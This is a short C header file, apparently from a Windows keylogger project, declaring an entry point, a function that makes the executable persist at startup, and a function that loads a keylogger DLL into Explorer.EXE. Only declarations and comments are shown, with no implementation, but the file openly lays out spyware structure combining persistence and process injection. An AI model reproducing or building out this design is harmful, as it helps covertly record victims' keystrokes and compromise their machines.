#ifndef ENTRY_H
#define ENTRY_H
#include "pch.h"
#include "mapper.h"
#include "dll.h"

//
// entry point - tries to make it persistant & loads dll into Explorer.EXE
//
int __stdcall wWinMain(
    IN HINSTANCE Instance,
    IN OPTIONAL HINSTANCE PrevInstance,
    IN LPWSTR CmdLine,
    IN int CmdShow
);

//
// Makes the current executable persistant (launches at startup), also successful if it already is persistant 
// @return BOOL returns true if action was deemed successful.
//
BOOL
MakePersistant(
    VOID
);

//
// Loads the keylogger dll into Explorer.EXE
//
VOID
LoadDll(
    VOID
);


#endif